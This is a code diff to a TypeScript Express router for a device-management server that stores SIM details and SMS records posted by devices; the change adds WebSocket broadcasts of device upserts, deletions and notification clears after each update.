@@ -63,6 +63,17 @@ function getDeviceTelegramMeta(device: any, deviceId: string) {
   };
 }
 
+async function emitDeviceUpsert(deviceId: string) {
+  try {
+    const doc = await Device.findOne({ deviceId }).lean();
+    if (doc) {
+      wsService.broadcastDeviceUpsert(doc);
+    }
+  } catch (e) {
+    logger.warn("devices: emitDeviceUpsert failed", { deviceId, error: e });
+  }
+}
+
 /* ================= LIST ALL DEVICES ================= */
 
 router.get("/", async (_req, res) => {
@@ -142,7 +153,7 @@ router.put("/:deviceId/admins", async (req, res) => {
         },
       },
       { upsert: true, new: true },
-    );
+    ).lean();
 
     try {
       wsService.sendCommandToDevice(deviceId, "admins:update", {
@@ -151,6 +162,12 @@ router.put("/:deviceId/admins", async (req, res) => {
       });
     } catch (e) {
       logger.warn("devices: ws admins:update failed", e);
+    }
+
+    try {
+      if (doc) wsService.broadcastDeviceUpsert(doc);
+    } catch (e) {
+      logger.warn("devices: broadcast device:upsert after admins failed", e);
     }
 
     return res.json({
@@ -209,7 +226,7 @@ router.put("/:deviceId/forwardingSim", async (req, res) => {
         },
       },
       { upsert: true, new: true },
-    );
+    ).lean();
 
     try {
       wsService.sendCommandToDevice(deviceId, "forwardingSim:update", {
@@ -218,6 +235,12 @@ router.put("/:deviceId/forwardingSim", async (req, res) => {
       });
     } catch (e) {
       logger.warn("devices: ws forwardingSim:update failed", e);
+    }
+
+    try {
+      if (doc) wsService.broadcastDeviceUpsert(doc);
+    } catch (e) {
+      logger.warn("devices: broadcast device:upsert after forwardingSim failed", e);
     }
 
     return res.json({
@@ -265,6 +288,8 @@ router.put("/:deviceId/simInfo", async (req, res) => {
       { upsert: true },
     );
 
+    await emitDeviceUpsert(deviceId);
+
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("devices: update simInfo failed", err);
@@ -277,10 +302,6 @@ router.put("/:deviceId/simInfo", async (req, res) => {
 
 /* ================= FCM TOKEN ================= */
 
-/**
- * PUT /api/devices/:deviceId/fcm-token
- * body: { token: string } OR { fcmToken: string }
- */
 router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
   try {
     const deviceId = clean(req.params.deviceId);
@@ -306,6 +327,8 @@ router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
       deviceId,
       tokenLength: token.length,
     });
+
+    await emitDeviceUpsert(deviceId);
 
     return res.json({
       success: true,
@@ -367,6 +390,8 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
     } catch (e) {
       logger.warn("wsService notify simSlots failed", e);
     }
+
+    await emitDeviceUpsert(deviceId);
 
     return res.json({ success: true });
   } catch (err: any) {
@@ -515,6 +540,13 @@ router.delete("/notifications/device/:deviceId", async (req, res) => {
   try {
     const deviceId = clean(req.params.deviceId);
     await Sms.deleteMany({ deviceId });
+
+    try {
+      wsService.broadcastNotificationClearDevice(deviceId);
+    } catch (e) {
+      logger.warn("notifications clear device broadcast failed", e);
+    }
+
     return res.json({ success: true });
   } catch (e: any) {
     logger.error("notifications delete for device failed", e);
@@ -525,6 +557,13 @@ router.delete("/notifications/device/:deviceId", async (req, res) => {
 router.delete("/notifications", async (_req, res) => {
   try {
     await Sms.deleteMany({});
+
+    try {
+      wsService.broadcastNotificationClearAll();
+    } catch (e) {
+      logger.warn("notifications clear all broadcast failed", e);
+    }
+
     return res.json({ success: true });
   } catch (e: any) {
     logger.error("notifications delete all failed", e);
@@ -536,6 +575,13 @@ router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
   try {
     const cutoff = Number(req.params.cutoff || 0);
     await Sms.deleteMany({ timestamp: { $lt: cutoff } });
+
+    try {
+      wsService.broadcastNotificationClearAll();
+    } catch (e) {
+      logger.warn("notifications olderThan broadcast failed", e);
+    }
+
     return res.json({ success: true });
   } catch (e: any) {
     logger.error("notifications delete olderThan failed", e);
@@ -592,6 +638,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
         deviceId,
         data: {
           id: smsDoc._id,
+          _id: smsDoc._id,
           title: smsDoc.title,
           sender: smsDoc.sender,
           senderNumber: smsDoc.senderNumber,
@@ -613,6 +660,21 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       }
     } catch (emitErr) {
       logger.warn("WS emit failed (non-fatal)", emitErr);
+    }
+
+    try {
+      await Device.findOneAndUpdate(
+        { deviceId },
+        {
+          $set: {
+            "status.timestamp": finalTimestamp,
+          },
+        },
+        { upsert: true },
+      );
+      await emitDeviceUpsert(deviceId);
+    } catch (e) {
+      logger.warn("devices: emit device upsert after sms failed", e);
     }
 
     try {
@@ -712,7 +774,7 @@ router.put("/:deviceId/status", async (req, res) => {
     const online = !!req.body?.online;
     const ts = Number(req.body?.timestamp || Date.now());
 
-    await Device.findOneAndUpdate(
+    const doc = await Device.findOneAndUpdate(
       { deviceId },
       {
         $set: {
@@ -720,8 +782,8 @@ router.put("/:deviceId/status", async (req, res) => {
           "status.timestamp": isNaN(ts) ? Date.now() : ts,
         },
       },
-      { upsert: true },
-    );
+      { upsert: true, new: true },
+    ).lean();
 
     try {
       const payload = {
@@ -741,6 +803,12 @@ router.put("/:deviceId/status", async (req, res) => {
       logger.warn("WS emit status failed (non-fatal)", e);
     }
 
+    try {
+      if (doc) wsService.broadcastDeviceUpsert(doc);
+    } catch (e) {
+      logger.warn("devices: broadcast device:upsert after status failed", e);
+    }
+
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("devices: update status failed", err);
@@ -757,11 +825,17 @@ router.put("/:deviceId", async (req, res) => {
   try {
     const deviceId = clean(req.params.deviceId);
 
-    await Device.findOneAndUpdate(
+    const doc = await Device.findOneAndUpdate(
       { deviceId },
       { $set: { metadata: req.body } },
-      { upsert: true },
-    );
+      { upsert: true, new: true },
+    ).lean();
+
+    try {
+      if (doc) wsService.broadcastDeviceUpsert(doc);
+    } catch (e) {
+      logger.warn("devices: broadcast device:upsert after metadata failed", e);
+    }
 
     return res.json({ success: true });
   } catch (err: any) {
@@ -779,7 +853,7 @@ router.delete("/status/:deviceId", async (req, res) => {
   try {
     const deviceId = clean(req.params.deviceId);
 
-    await Device.updateOne(
+    const doc = await Device.findOneAndUpdate(
       { deviceId },
       {
         $set: {
@@ -787,7 +861,14 @@ router.delete("/status/:deviceId", async (req, res) => {
           "status.timestamp": Date.now(),
         },
       },
-    );
+      { new: true },
+    ).lean();
+
+    try {
+      if (doc) wsService.broadcastDeviceUpsert(doc);
+    } catch (e) {
+      logger.warn("devices: broadcast device:upsert after delete status failed", e);
+    }
 
     return res.json({ success: true });
   } catch (err: any) {
@@ -802,6 +883,12 @@ router.delete("/:deviceId", async (req, res) => {
     const existingDevice = await Device.findOne({ deviceId }).lean();
 
     await Device.deleteOne({ deviceId });
+
+    try {
+      wsService.broadcastDeviceDelete(deviceId);
+    } catch (e) {
+      logger.warn("devices: broadcast device:delete failed", e);
+    }
 
     try {
       const meta = getDeviceTelegramMeta(existingDevice, deviceId);
